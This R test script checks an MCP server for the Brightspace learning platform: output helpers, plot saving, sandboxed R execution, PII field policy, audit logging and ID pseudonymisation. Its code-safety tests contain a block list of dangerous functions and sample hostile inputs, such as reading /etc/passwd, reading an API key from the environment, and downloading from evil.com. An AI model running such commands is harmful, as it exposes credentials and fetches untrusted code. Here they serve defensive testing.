#!/usr/bin/env Rscript
# ── Basic test script for brightspaceR MCP server ─────────────────────────
# Tests internal functions without needing a live Brightspace connection.
# Run from the package root: Rscript inst/mcp/test_server.R

cat("=== brightspaceR MCP Server Tests ===\n\n")

pass <- 0L
fail <- 0L

test <- function(name, expr) {
  result <- tryCatch(
    {
      ok <- eval(expr)
      if (isTRUE(ok)) {
        cat("[PASS]", name, "\n")
        pass <<- pass + 1L
      } else {
        cat("[FAIL]", name, "-- returned", as.character(ok), "\n")
        fail <<- fail + 1L
      }
    },
    error = function(e) {
      cat("[FAIL]", name, "--", conditionMessage(e), "\n")
      fail <<- fail + 1L
    }
  )
}

# ── Load server internals ─────────────────────────────────────────────────
# Source just the helper functions, skip the auth and main loop
suppressPackageStartupMessages({
  library(jsonlite)
  library(stringr)
  library(ggplot2)
})

# Stub out brightspaceR functions so we don't need a live connection
pkg_root <- normalizePath(file.path(dirname(
  if (length(grep("^--file=", commandArgs(FALSE), value = TRUE)) > 0)
    sub("^--file=", "", grep("^--file=", commandArgs(FALSE), value = TRUE)[1])
  else "."
), "..", ".."), mustWork = FALSE)

cat("Package root:", pkg_root, "\n\n")

# ── 1. Test helper functions ──────────────────────────────────────────────

cat("--- Helper Functions ---\n")

empty_obj <- function() structure(list(), names = character(0))

test("empty_obj serializes as {}", {
  j <- as.character(jsonlite::toJSON(empty_obj(), auto_unbox = TRUE))
  j == "{}"
})

normalize_name <- function(name) {
  name <- str_replace_all(name, "[^A-Za-z0-9 ]", "")
  name <- str_trim(name)
  name <- str_replace_all(name, "\\s+", "_")
  str_to_lower(name)
}

test("normalize_name: basic", normalize_name("Grade Results") == "grade_results")
test("normalize_name: special chars", normalize_name("User (Enrollments)!") == "user_enrollments")
test("normalize_name: extra spaces", normalize_name("  Org  Units  ") == "org_units")

html_esc <- function(x) {
  x <- str_replace_all(x, fixed("&"), "&amp;")
  x <- str_replace_all(x, fixed("<"), "&lt;")
  x <- str_replace_all(x, fixed(">"), "&gt;")
  x <- str_replace_all(x, fixed("'"), "&#39;")
  x <- str_replace_all(x, fixed('"'), "&quot;")
  x
}

test("html_esc: escapes all special chars", {
  html_esc("<script>alert('x\"&')") == "&lt;script&gt;alert(&#39;x&quot;&amp;&#39;)"
})

# ── 2. Test mcp_text / mcp_result ────────────────────────────────────────

cat("\n--- Content Helpers ---\n")

to_json <- function(x) {
  jsonlite::toJSON(x, auto_unbox = TRUE, POSIXt = "ISO8601", null = "null",
                   na = "null", dataframe = "rows", pretty = FALSE)
}

MAX_RESULT_BYTES <- 800000L

mcp_text <- function(text, audience = NULL) {
  content <- list(type = "text", text = text)
  if (!is.null(audience)) {
    content$annotations <- list(audience = audience)
  }
  content
}

mcp_result <- function(contents, is_error = FALSE) {
  if (!is.list(contents[[1]])) {
    contents <- list(contents)
  }
  result <- list(content = contents, isError = is_error)
  json_size <- nchar(as.character(to_json(result)), type = "bytes")
  if (json_size > MAX_RESULT_BYTES) {
    for (i in seq_along(result$content)) {
      if (result$content[[i]]$type == "text") {
        text <- result$content[[i]]$text
        keep_bytes <- MAX_RESULT_BYTES - 500L
        text <- substr(text, 1, keep_bytes)
        text <- paste0(text, "\n\n... [TRUNCATED]")
        result$content[[i]]$text <- text
        break
      }
    }
  }
  result
}

test("mcp_text: basic", {
  t <- mcp_text("hello")
  t$type == "text" && t$text == "hello" && is.null(t$annotations)
})

test("mcp_text: with audience", {
  t <- mcp_text("info", audience = list("assistant"))
  !is.null(t$annotations) && identical(t$annotations$audience, list("assistant"))
})

test("mcp_text: audience serializes as array", {
  t <- mcp_text("info", audience = list("assistant"))
  j <- as.character(to_json(t))
  grepl('"audience":\\["assistant"\\]', j)
})

test("mcp_result: wraps single content", {
  r <- mcp_result(list(mcp_text("hi")))
  length(r$content) == 1 && r$content[[1]]$text == "hi" && !r$isError
})

test("mcp_result: error flag", {
  r <- mcp_result(list(mcp_text("bad")), is_error = TRUE)
  r$isError == TRUE
})

test("mcp_result: truncates oversized text", {
  big <- paste(rep("x", 900000), collapse = "")
  r <- mcp_result(list(mcp_text(big)))
  grepl("TRUNCATED", r$content[[1]]$text)
})

# ── 3. Test summarize_column ─────────────────────────────────────────────

cat("\n--- Column Summarizer ---\n")

summarize_column <- function(x, col_name) {
  n_missing <- sum(is.na(x))
  info <- list(column = col_name, type = class(x)[1], n_missing = n_missing)
  if (is.numeric(x)) {
    vals <- x[!is.na(x)]
    if (length(vals) > 0) {
      info$min <- round(min(vals), 4)
      info$max <- round(max(vals), 4)
      info$mean <- round(mean(vals), 4)
    }
  } else if (is.character(x) || is.factor(x)) {
    vals <- as.character(x[!is.na(x)])
    info$n_unique <- length(unique(vals))
    if (length(vals) > 0) {
      tbl <- sort(table(vals), decreasing = TRUE)
      top_n <- min(3, length(tbl))
      top_vals <- utils::head(tbl, top_n)
      info$top_values <- paste(
        paste0(names(top_vals), " (", as.integer(top_vals), ")"),
        collapse = ", "
      )
    }
  } else if (is.logical(x)) {
    info$n_true <- sum(x, na.rm = TRUE)
    info$n_false <- sum(!x, na.rm = TRUE)
  } else if (inherits(x, "Date") || inherits(x, "POSIXt")) {
    vals <- x[!is.na(x)]
    if (length(vals) > 0) {
      info$min <- as.character(min(vals))
      info$max <- as.character(max(vals))
    }
  }
  info
}

test("summarize_column: numeric", {
  s <- summarize_column(c(1, 2, 3, NA), "x")
  s$type == "numeric" && s$min == 1 && s$max == 3 && s$mean == 2 && s$n_missing == 1
})

test("summarize_column: character", {
  s <- summarize_column(c("a", "b", "a", "c", "a"), "x")
  s$type == "character" && s$n_unique == 3 && grepl("a \\(3\\)", s$top_values)
})

test("summarize_column: logical", {
  s <- summarize_column(c(TRUE, FALSE, TRUE, NA), "x")
  s$type == "logical" && s$n_true == 2 && s$n_false == 1 && s$n_missing == 1
})

test("summarize_column: date", {
  d <- as.Date(c("2024-01-01", "2024-06-15", NA))
  s <- summarize_column(d, "x")
  s$type == "Date" && s$min == "2024-01-01" && s$max == "2024-06-15" && s$n_missing == 1
})

test("summarize_column: empty numeric", {
  s <- summarize_column(numeric(0), "x")
  s$type == "numeric" && is.null(s$min) && s$n_missing == 0
})

# ── 4. Test save_plot ────────────────────────────────────────────────────

cat("\n--- Plot Saving ---\n")

MCP_OUTPUT_DIR <- tempdir()
mcp_log <- function(...) invisible(NULL)

save_plot <- function(plot_obj, title = NULL) {
  title <- title %||% plot_obj$labels$title %||% "plot"
  slug <- str_replace_all(title, "[^A-Za-z0-9]+", "_")
  slug <- str_replace_all(slug, "^_|_$", "")
  slug <- tolower(substr(slug, 1, 60))
  timestamp <- format(Sys.time(), "%Y%m%d_%H%M%S")
  base_name <- paste0(slug, "_", timestamp)
  png_path <- file.path(MCP_OUTPUT_DIR, paste0(base_name, ".png"))
  html_path <- file.path(MCP_OUTPUT_DIR, paste0(base_name, ".html"))
  if (requireNamespace("ragg", quietly = TRUE)) {
    ragg::agg_png(png_path, width = 900, height = 600, res = 150, background = "white")
  } else {
    grDevices::png(png_path, width = 900, height = 600, res = 150, bg = "white")
  }
  print(plot_obj)
  grDevices::dev.off()
  png_file <- basename(png_path)
  html_title <- if (!is.null(plot_obj$labels$title)) plot_obj$labels$title else title
  html_content <- paste0(
    "<!DOCTYPE html>\n<html>\n<head>\n",
    "  <meta charset='utf-8'>\n",
    "  <title>", html_esc(html_title), "</title>\n",
    "  <style>body{font-family:system-ui;margin:2rem}img{max-width:100%}</style>\n",
    "</head>\n<body>\n",
    "  <h1>", html_esc(html_title), "</h1>\n",
    "  <img src='", png_file, "'>\n",
    "</body>\n</html>"
  )
  writeLines(html_content, html_path)
  list(png_path = png_path, html_path = html_path)
}

test("save_plot: creates PNG and HTML", {
  p <- ggplot(mtcars, aes(x = factor(cyl))) + geom_bar() + labs(title = "Test Plot")
  paths <- save_plot(p)
  file.exists(paths$png_path) && file.exists(paths$html_path)
})

test("save_plot: PNG is non-empty", {
  p <- ggplot(mtcars, aes(x = factor(cyl))) + geom_bar() + labs(title = "Size Check")
  paths <- save_plot(p)
  file.info(paths$png_path)$size > 1000
})

test("save_plot: HTML references the PNG", {
  p <- ggplot(mtcars, aes(x = hp, y = mpg)) + geom_point() + labs(title = "Scatter")
  paths <- save_plot(p)
  html <- readLines(paths$html_path, warn = FALSE)
  any(str_detect(html, basename(paths$png_path)))
})

test("save_plot: HTML has correct title", {
  p <- ggplot(mtcars, aes(x = wt)) + geom_histogram() + labs(title = "Weight Dist")
  paths <- save_plot(p)
  html <- paste(readLines(paths$html_path, warn = FALSE), collapse = "\n")
  str_detect(html, "Weight Dist")
})

test("save_plot: slug sanitizes special chars", {
  p <- ggplot(mtcars, aes(x = cyl)) + geom_bar() + labs(title = "Test: <Special> & 'Chars'")
  paths <- save_plot(p)
  # Filename should not contain special chars
  !str_detect(basename(paths$png_path), "[<>&']")
})

# ── 5. Test execute_r workspace ──────────────────────────────────────────

cat("\n--- Workspace & execute_r ---\n")

.mcp_workspace <- new.env(parent = globalenv())
local({
  suppressPackageStartupMessages({
    require(dplyr, quietly = TRUE)
    require(tidyr, quietly = TRUE)
    require(ggplot2, quietly = TRUE)
  })
}, envir = .mcp_workspace)

test("workspace: dplyr is loaded", {
  exists("filter", envir = .mcp_workspace, inherits = TRUE)
})

test("workspace: ggplot2 is loaded", {
  exists("ggplot", envir = .mcp_workspace, inherits = TRUE)
})

test("workspace: variables persist", {
  eval(parse(text = "test_var <- 42"), envir = .mcp_workspace)
  eval(parse(text = "test_var"), envir = .mcp_workspace) == 42
})

test("workspace: dplyr pipeline works", {
  result <- eval(parse(text = "mtcars %>% count(cyl) %>% nrow()"), envir = .mcp_workspace)
  result == 3
})

test("workspace: ggplot object detection", {
  result <- eval(parse(text = "ggplot(mtcars, aes(x = cyl)) + geom_bar()"),
                 envir = .mcp_workspace)
  inherits(result, "gg")
})

# ── 5b. Test execute_r eval chain (mirrors handle_execute_r exactly) ────

cat("\n--- execute_r eval chain ---\n")

test("eval chain: env-based capture gets ggplot", {
  .res <- new.env(parent = emptyenv())
  .res$val <- NULL
  .res$output <- character(0)
  .res$messages <- character(0)
  eval_result <- tryCatch(
    withCallingHandlers(
      {
        .res$output <- utils::capture.output({
          .res$val <- eval(
            parse(text = "ggplot(mtcars, aes(x = factor(cyl))) + geom_bar()"),
            envir = .mcp_workspace
          )
        })
        "success"
      },
      message = function(m) {
        .res$messages <- c(.res$messages, conditionMessage(m))
        invokeRestart("muffleMessage")
      }
    ),
    error = function(e) conditionMessage(e)
  )
  eval_result == "success" &&
    !is.null(.res$val) &&
    inherits(.res$val, "gg")
})

test("eval chain: env-based capture gets data frame", {
  .res <- new.env(parent = emptyenv())
  .res$val <- NULL
  .res$output <- character(0)
  .res$messages <- character(0)
  eval_result <- tryCatch(
    withCallingHandlers(
      {
        .res$output <- utils::capture.output({
          .res$val <- eval(
            parse(text = "mtcars %>% count(cyl)"),
            envir = .mcp_workspace
          )
        })
        "success"
      },
      message = function(m) {
        .res$messages <- c(.res$messages, conditionMessage(m))
        invokeRestart("muffleMessage")
      }
    ),
    error = function(e) conditionMessage(e)
  )
  eval_result == "success" &&
    !is.null(.res$val) &&
    is.data.frame(.res$val) &&
    nrow(.res$val) == 3
})

test("eval chain: multi-line code returns last expression", {
  .res <- new.env(parent = emptyenv())
  .res$val <- NULL
  .res$output <- character(0)
  .res$messages <- character(0)
  code <- "data <- mtcars\nggplot(data, aes(x = hp, y = mpg)) + geom_point()"
  eval_result <- tryCatch(
    withCallingHandlers(
      {
        .res$output <- utils::capture.output({
          .res$val <- eval(parse(text = code), envir = .mcp_workspace)
        })
        "success"
      },
      message = function(m) {
        .res$messages <- c(.res$messages, conditionMessage(m))
        invokeRestart("muffleMessage")
      }
    ),
    error = function(e) conditionMessage(e)
  )
  eval_result == "success" &&
    inherits(.res$val, "gg")
})

test("eval chain: ggplot saves to disk via save_plot", {
  .res <- new.env(parent = emptyenv())
  .res$val <- NULL
  .res$output <- character(0)
  tryCatch(
    {
      .res$output <- utils::capture.output({
        .res$val <- eval(
          parse(text = "ggplot(mtcars, aes(x = wt, y = mpg)) + geom_point() + labs(title = 'Chain Test')"),
          envir = .mcp_workspace
        )
      })
    },
    error = function(e) NULL
  )
  result_val <- .res$val
  is_ggplot <- inherits(result_val, "gg") || inherits(result_val, "ggplot") ||
    any(c("gg", "ggplot") %in% class(result_val))
  if (!is_ggplot) return(FALSE)
  paths <- save_plot(result_val)
  file.exists(paths$png_path) && file.exists(paths$html_path)
})

# ── 6. Test timeout ──────────────────────────────────────────────────────

cat("\n--- Timeout ---\n")

test("timeout: setTimeLimit fires on R computation", {
  err <- tryCatch(
    {
      setTimeLimit(elapsed = 1, transient = TRUE)
      # Busy loop in R (not C-level sleep) so time limit can interrupt
      x <- 0; while (TRUE) x <- x + 1
      setTimeLimit(elapsed = Inf, transient = TRUE)
      "no error"
    },
    error = function(e) {
      setTimeLimit(elapsed = Inf, transient = TRUE)
      conditionMessage(e)
    }
  )
  grepl("time limit|elapsed", err, ignore.case = TRUE)
})

# ── 7. Test JSON-RPC response structure ──────────────────────────────────

cat("\n--- JSON-RPC Structure ---\n")

test("tool result JSON: valid structure", {
  r <- mcp_result(list(mcp_text("hello world")))
  j <- as.character(to_json(list(jsonrpc = "2.0", id = 1L, result = r)))
  parsed <- fromJSON(j, simplifyVector = FALSE)
  parsed$jsonrpc == "2.0" &&
    parsed$id == 1 &&
    parsed$result$content[[1]]$type == "text" &&
    parsed$result$content[[1]]$text == "hello world" &&
    parsed$result$isError == FALSE
})

test("tool result JSON: error structure", {
  r <- mcp_result(list(mcp_text("something broke")), is_error = TRUE)
  j <- as.character(to_json(list(jsonrpc = "2.0", id = 2L, result = r)))
  parsed <- fromJSON(j, simplifyVector = FALSE)
  parsed$result$isError == TRUE
})

test("initialize response: has instructions", {
  resp <- list(
    jsonrpc = "2.0",
    id = 1L,
    result = list(
      protocolVersion = "2025-06-18",
      capabilities = list(tools = empty_obj()),
      serverInfo = list(name = "brightspaceR", version = "0.1.0"),
      instructions = "test instructions"
    )
  )
  j <- as.character(to_json(resp))
  parsed <- fromJSON(j, simplifyVector = FALSE)
  parsed$result$instructions == "test instructions"
})

# ── 8. AST Code Inspection Tests ──────────────────────────────────────

cat("\n--- AST Code Inspection ---\n")

# Define the functions locally for testing
BLOCKED_PACKAGES <- c("brightspaceR", "httr", "httr2", "curl", "jsonlite", "config")

BLOCKED_FUNCTIONS <- c(
  "eval", "evalq", "do.call", "get", "mget", "exists", "match.fun",
  "getExportedValue", "loadNamespace", "requireNamespace",
  "Sys.getenv", "Sys.setenv",
  "system", "system2", "shell",
  "readLines", "scan", "file", "readRDS", "writeLines",
  "write.csv", "write.csv2", "saveRDS",
  "download.file", "url", "socketConnection"
)

walk_ast <- function(expr, blocked = character(0)) {
  if (is.call(expr)) {
    fn <- expr[[1]]
    if (is.call(fn) && length(fn) == 3 &&
        (identical(fn[[1]], as.name("::")) || identical(fn[[1]], as.name(":::")))) {
      pkg_name <- as.character(fn[[2]])
      if (pkg_name %in% BLOCKED_PACKAGES) {
        blocked <- c(blocked, paste0(pkg_name, "::", as.character(fn[[3]])))
      }
    } else if (is.name(fn)) {
      fn_name <- as.character(fn)
      if (fn_name %in% BLOCKED_FUNCTIONS) {
        blocked <- c(blocked, fn_name)
      }
    } else if (is.call(fn) && length(fn) == 3 && identical(fn[[1]], as.name("$"))) {
      compound <- paste0(as.character(fn[[2]]), "$", as.character(fn[[3]]))
      if (compound %in% BLOCKED_FUNCTIONS) {
        blocked <- c(blocked, compound)
      }
    }
    for (i in seq_along(expr)) {
      blocked <- walk_ast(expr[[i]], blocked)
    }
  } else if (is.pairlist(expr) || (is.recursive(expr) && !is.environment(expr))) {
    for (i in seq_along(expr)) {
      blocked <- walk_ast(expr[[i]], blocked)
    }
  }
  blocked
}

check_code_safety <- function(code) {
  parsed <- tryCatch(parse(text = code), error = function(e) NULL)
  if (is.null(parsed)) return(list(safe = TRUE))
  blocked <- character(0)
  for (i in seq_along(parsed)) {
    blocked <- walk_ast(parsed[[i]], blocked)
  }
  blocked <- unique(blocked)
  if (length(blocked) == 0) list(safe = TRUE)
  else list(safe = FALSE, blocked = blocked)
}

# Clean code that MUST pass
test("AST: dplyr pipe chain passes", {
  r <- check_code_safety("mtcars %>% filter(cyl == 6) %>% summarise(mean_mpg = mean(mpg))")
  r$safe
})

test("AST: ggplot2 code passes", {
  r <- check_code_safety("ggplot(mtcars, aes(x = hp, y = mpg)) + geom_point() + labs(title = 'Test')")
  r$safe
})

test("AST: basic assignment and arithmetic passes", {
  r <- check_code_safety("x <- 1 + 2\ny <- x * 3")
  r$safe
})

test("AST: comments containing blocked names pass", {
  r <- check_code_safety("# system('hello')\nx <- 1")
  r$safe
})

test("AST: strings containing blocked names pass", {
  r <- check_code_safety('msg <- "call system() to get info"\nprint(msg)')
  r$safe
})

# Blocked code that MUST fail
test("AST: brightspaceR::bs_get blocked", {
  r <- check_code_safety("brightspaceR::bs_get()")
  !r$safe && any(grepl("brightspaceR", r$blocked))
})

test("AST: brightspaceR::: internal access blocked", {
  r <- check_code_safety("brightspaceR:::internal_fn()")
  !r$safe && any(grepl("brightspaceR", r$blocked))
})

test("AST: httr::GET blocked", {
  r <- check_code_safety("httr::GET('http://example.com')")
  !r$safe && any(grepl("httr", r$blocked))
})

test("AST: httr2::request blocked", {
  r <- check_code_safety("httr2::request('http://example.com')")
  !r$safe && any(grepl("httr2", r$blocked))
})

test("AST: curl::curl blocked", {
  r <- check_code_safety("curl::curl('http://example.com')")
  !r$safe && any(grepl("curl", r$blocked))
})

test("AST: config::get blocked", {
  r <- check_code_safety("config::get('default')")
  !r$safe && any(grepl("config", r$blocked))
})

test("AST: eval() blocked", {
  r <- check_code_safety("eval(parse(text = 'system(\"ls\")'))")
  !r$safe && "eval" %in% r$blocked
})

test("AST: evalq() blocked", {
  r <- check_code_safety("evalq(x + 1)")
  !r$safe && "evalq" %in% r$blocked
})

test("AST: do.call() blocked", {
  r <- check_code_safety("do.call(sum, list(1:10))")
  !r$safe && "do.call" %in% r$blocked
})

test("AST: get() and mget() blocked", {
  r <- check_code_safety("get('secret_var')\nmget(c('a','b'))")
  !r$safe && "get" %in% r$blocked && "mget" %in% r$blocked
})

test("AST: Sys.getenv() blocked", {
  r <- check_code_safety("Sys.getenv('API_KEY')")
  !r$safe && "Sys.getenv" %in% r$blocked
})

test("AST: system() and system2() blocked", {
  r <- check_code_safety("system('whoami')\nsystem2('ls')")
  !r$safe && "system" %in% r$blocked && "system2" %in% r$blocked
})

test("AST: readLines() and writeLines() blocked", {
  r <- check_code_safety("readLines('/etc/passwd')\nwriteLines('hi', 'out.txt')")
  !r$safe && "readLines" %in% r$blocked && "writeLines" %in% r$blocked
})

test("AST: readRDS() and saveRDS() blocked", {
  r <- check_code_safety("readRDS('data.rds')\nsaveRDS(x, 'out.rds')")
  !r$safe && "readRDS" %in% r$blocked && "saveRDS" %in% r$blocked
})

test("AST: download.file() blocked", {
  r <- check_code_safety("download.file('http://evil.com/payload', 'out')")
  !r$safe && "download.file" %in% r$blocked
})

test("AST: multiple blocked constructs in one expression", {
  r <- check_code_safety("system('ls')\neval(parse(text='1'))\nhttr::GET('url')")
  !r$safe && length(r$blocked) == 3
})

test("AST: syntax errors pass through (safe=TRUE)", {
  r <- check_code_safety("this is not valid R {{{{")
  r$safe
})

# ── 9. PII Field Policy Tests ───────────────────────────────────────────

cat("\n--- PII Field Policy ---\n")

# Define apply_field_policy locally for testing
.test_policy_cache <- new.env(parent = emptyenv())

apply_field_policy_test <- function(df, dataset_name, policy) {
  ds_policy <- policy[[dataset_name]]
  if (is.null(ds_policy)) return(df)
  mode <- ds_policy$mode
  if (is.null(mode) || mode == "all") return(df)
  if (mode == "allow") {
    allowed <- ds_policy$fields
    if (is.null(allowed)) return(df)
    keep <- intersect(allowed, names(df))
    return(df[, keep, drop = FALSE])
  }
  if (mode == "redact") {
    redact_cols <- ds_policy$fields
    if (!is.null(redact_cols)) {
      for (col in redact_cols) {
        if (col %in% names(df)) df[[col]] <- "[REDACTED]"
      }
    }
    return(df)
  }
  df
}

# Load the real policy file
policy_path <- file.path(pkg_root, "inst", "mcp", "field_policy.yml")
if (file.exists(policy_path)) {
  test_policy <- yaml::read_yaml(policy_path)
} else {
  cat("WARNING: field_policy.yml not found at", policy_path, "\n")
  test_policy <- list()
}

test("field policy: allow mode keeps only listed fields", {
  df <- data.frame(UserId = 1, FirstName = "Jane", LastName = "Doe",
                   Organization = "Org1", IsActive = TRUE, stringsAsFactors = FALSE)
  result <- apply_field_policy_test(df, "Users", test_policy)
  "UserId" %in% names(result) && "Organization" %in% names(result) &&
    !("FirstName" %in% names(result)) && !("LastName" %in% names(result))
})

test("field policy: allow mode excludes PII (ExternalEmail)", {
  df <- data.frame(UserId = 1, ExternalEmail = "jane@example.com",
                   Organization = "Org1", stringsAsFactors = FALSE)
  result <- apply_field_policy_test(df, "Users", test_policy)
  !("ExternalEmail" %in% names(result))
})

test("field policy: redact mode replaces values", {
  # Create a test policy with redact mode
  redact_policy <- list(TestDS = list(mode = "redact", fields = list("Secret")))
  df <- data.frame(Id = 1, Secret = "password123", Public = "hello",
                   stringsAsFactors = FALSE)
  result <- apply_field_policy_test(df, "TestDS", redact_policy)
  result$Secret == "[REDACTED]" && result$Public == "hello"
})

test("field policy: all mode passes everything through", {
  df <- data.frame(OrgUnitId = 1, Name = "Test Org", Code = "T01",
                   stringsAsFactors = FALSE)
  result <- apply_field_policy_test(df, "Org Units", test_policy)
  ncol(result) == 3
})

test("field policy: unknown dataset passes through", {
  df <- data.frame(a = 1, b = 2, stringsAsFactors = FALSE)
  result <- apply_field_policy_test(df, "NonExistentDataset", test_policy)
  identical(names(result), c("a", "b"))
})

test("field policy: new/unknown columns excluded by allow mode", {
  df <- data.frame(UserId = 1, Organization = "Org1",
                   BrandNewColumn = "surprise", stringsAsFactors = FALSE)
  result <- apply_field_policy_test(df, "Users", test_policy)
  !("BrandNewColumn" %in% names(result))
})

test("field policy: default YAML is valid", {
  length(test_policy) > 0
})

test("field policy: Users is in allow mode with PII excluded", {
  !is.null(test_policy[["Users"]]) &&
    test_policy[["Users"]]$mode == "allow" &&
    !("FirstName" %in% test_policy[["Users"]]$fields) &&
    !("LastName" %in% test_policy[["Users"]]$fields) &&
    !("ExternalEmail" %in% test_policy[["Users"]]$fields) &&
    "UserId" %in% test_policy[["Users"]]$fields
})

test("field policy: Role Details is in all mode", {
  !is.null(test_policy[["Role Details"]]) &&
    test_policy[["Role Details"]]$mode == "all"
})

# ── 10. Audit Logging Tests ─────────────────────────────────────────────

cat("\n--- Audit Logging ---\n")

audit_test_dir <- tempfile("audit_test")
dir.create(audit_test_dir)
AUDIT_LOG_PATH_TEST <- file.path(audit_test_dir, "mcp_audit.jsonl")

audit_log_test <- function(tool, arguments = NULL, response_bytes = 0L,
                           code_blocked = FALSE, blocked_constructs = NULL,
                           is_error = FALSE) {
  entry <- list(
    timestamp = format(Sys.time(), "%Y-%m-%dT%H:%M:%OS3Z", tz = "UTC"),
    tool = tool
  )
  if (!is.null(arguments)) {
    args_copy <- arguments
    if (!is.null(args_copy$code) && nchar(args_copy$code) > 500) {
      args_copy$code <- paste0(substr(args_copy$code, 1, 500), "...[truncated]")
    }
    entry$arguments <- args_copy
  }
  entry$response_bytes <- as.integer(response_bytes)
  entry$code_blocked <- code_blocked
  if (!is.null(blocked_constructs) && length(blocked_constructs) > 0) {
    entry$blocked_constructs <- as.list(blocked_constructs)
  }
  entry$is_error <- is_error
  line <- as.character(to_json(entry))
  cat(line, "\n", sep = "", file = AUDIT_LOG_PATH_TEST, append = TRUE)
}

test("audit: entry is valid JSONL", {
  audit_log_test("execute_r", arguments = list(code = "1+1"), response_bytes = 42L)
  lines <- readLines(AUDIT_LOG_PATH_TEST, warn = FALSE)
  parsed <- jsonlite::fromJSON(lines[length(lines)], simplifyVector = FALSE)
  !is.null(parsed$timestamp) && parsed$tool == "execute_r" &&
    parsed$response_bytes == 42
})

test("audit: blocked code logged with constructs", {
  audit_log_test("execute_r", arguments = list(code = "system('ls')"),
                 code_blocked = TRUE, blocked_constructs = c("system"),
                 is_error = TRUE)
  lines <- readLines(AUDIT_LOG_PATH_TEST, warn = FALSE)
  parsed <- jsonlite::fromJSON(lines[length(lines)], simplifyVector = FALSE)
  parsed$code_blocked == TRUE && "system" %in% unlist(parsed$blocked_constructs)
})

test("audit: error entries have is_error = TRUE", {
  audit_log_test("describe_dataset", is_error = TRUE)
  lines <- readLines(AUDIT_LOG_PATH_TEST, warn = FALSE)
  parsed <- jsonlite::fromJSON(lines[length(lines)], simplifyVector = FALSE)
  parsed$is_error == TRUE
})

# Clean up
unlink(audit_test_dir, recursive = TRUE)

# ── 11. ID Pseudonymisation Tests ────────────────────────────────────────

cat("\n--- ID Pseudonymisation ---\n")

# Define functions locally for testing — mirrors bs_pseudonymise_id / bs_pseudonymise_df API
PERSON_ID_COLUMNS <- list(
  "Users"                        = c("UserId"),
  "User Enrollments"             = c("UserId"),
  "Grade Results"                = c("UserId", "LastModifiedBy"),
  "Assignment Submissions"       = c("SubmitterId", "FeedbackUserId"),
  "Quiz User Answers"            = c("LastModifiedBy"),
  "Content User Progress"        = c("UserId"),
  "Quiz Attempts"                = c("UserId"),
  "Discussion Posts"             = c("UserId"),
  "Discussion Topics"            = c("LastPostUserId", "DeletedByUserId"),
  "Content Objects"              = c("CreatedBy", "LastModifiedBy", "DeletedBy"),
  "Grade Objects"                = c("DeletedByUserId"),
  "Enrollments and Withdrawals"  = c("UserId", "ModifiedByUserId"),
  "Final Grades"                 = c("UserId"),
  "Attendance Records"           = c("UserId")
)

.test_pseudonym_key <- openssl::rand_bytes(32)

pseudonymise_id <- function(values, key) {
  result <- rep(NA_character_, length(values))
  non_na <- !is.na(values)
  if (any(non_na)) {
    hashes <- vapply(as.character(values[non_na]), function(v) {
      raw_hash <- openssl::sha256(charToRaw(v), key = key)
      paste0("usr_", substr(as.character(raw_hash), 1, 8))
    }, character(1), USE.NAMES = FALSE)
    result[non_na] <- hashes
  }
  result
}

pseudonymise_df <- function(df, dataset_name, key, columns = NULL) {
  cols <- if (!is.null(columns)) columns else PERSON_ID_COLUMNS[[dataset_name]]
  if (is.null(cols)) return(df)
  for (col in cols) {
    if (col %in% names(df)) {
      df[[col]] <- pseudonymise_id(df[[col]], key = key)
    }
  }
  df
}

test("pseudonymise_id: basic — integer input produces usr_ prefixed 12-char string", {
  result <- pseudonymise_id(12345L, key = .test_pseudonym_key)
  grepl("^usr_[0-9a-f]{8}$", result) && nchar(result) == 12
})

test("pseudonymise_id: deterministic — same value + same key = same output", {
  a <- pseudonymise_id(42L, key = .test_pseudonym_key)
  b <- pseudonymise_id(42L, key = .test_pseudonym_key)
  identical(a, b)
})

test("pseudonymise_id: different values differ", {
  a <- pseudonymise_id(1L, key = .test_pseudonym_key)
  b <- pseudonymise_id(2L, key = .test_pseudonym_key)
  a != b
})

test("pseudonymise_id: NA passthrough", {
  result <- pseudonymise_id(c(1L, NA, 3L), key = .test_pseudonym_key)
  !is.na(result[1]) && is.na(result[2]) && !is.na(result[3])
})

test("pseudonymise_df: Users dataset — UserId is pseudonymised", {
  df <- data.frame(UserId = c(100L, 200L), Organization = c("Org1", "Org2"),
                   stringsAsFactors = FALSE)
  result <- pseudonymise_df(df, "Users", key = .test_pseudonym_key)
  all(grepl("^usr_", result$UserId)) && identical(result$Organization, df$Organization)
})

test("pseudonymise_df: structural IDs untouched — OrgUnitId stays numeric", {
  df <- data.frame(UserId = 1L, OrgUnitId = 999L, stringsAsFactors = FALSE)
  result <- pseudonymise_df(df, "User Enrollments", key = .test_pseudonym_key)
  grepl("^usr_", result$UserId) && is.integer(result$OrgUnitId) && result$OrgUnitId == 999L
})

test("pseudonymise_df: unknown dataset passthrough", {
  df <- data.frame(a = 1, b = 2, stringsAsFactors = FALSE)
  result <- pseudonymise_df(df, "NonExistentDataset", key = .test_pseudonym_key)
  identical(result, df)
})

test("pseudonymise_df: missing column silently skipped", {
  # Grade Results expects UserId and LastModifiedBy, but df only has UserId
  df <- data.frame(UserId = 1L, PointsNumerator = 85.0, stringsAsFactors = FALSE)
  result <- pseudonymise_df(df, "Grade Results", key = .test_pseudonym_key)
  grepl("^usr_", result$UserId) && result$PointsNumerator == 85.0
})

test("pseudonymise_df: multiple person ID columns — Grade Results", {
  df <- data.frame(UserId = 1L, LastModifiedBy = 2L, GradeObjectId = 999L,
                   stringsAsFactors = FALSE)
  result <- pseudonymise_df(df, "Grade Results", key = .test_pseudonym_key)
  grepl("^usr_", result$UserId) && grepl("^usr_", result$LastModifiedBy) &&
    is.integer(result$GradeObjectId) && result$GradeObjectId == 999L
})

test("pseudonymise_id: different session keys produce different pseudonyms", {
  key1 <- openssl::rand_bytes(32)
  key2 <- openssl::rand_bytes(32)
  a <- pseudonymise_id(42L, key = key1)
  b <- pseudonymise_id(42L, key = key2)
  a != b
})

test("pseudonymise_df: custom columns override registry", {
  df <- data.frame(MyId = 1L, OtherCol = "hello", stringsAsFactors = FALSE)
  result <- pseudonymise_df(df, "Users", key = .test_pseudonym_key, columns = c("MyId"))
  grepl("^usr_", result$MyId) && result$OtherCol == "hello"
})

# ── Summary ──────────────────────────────────────────────────────────────

cat("\n=== Results ===\n")
cat(pass, "passed,", fail, "failed\n")
if (fail > 0) quit(status = 1)
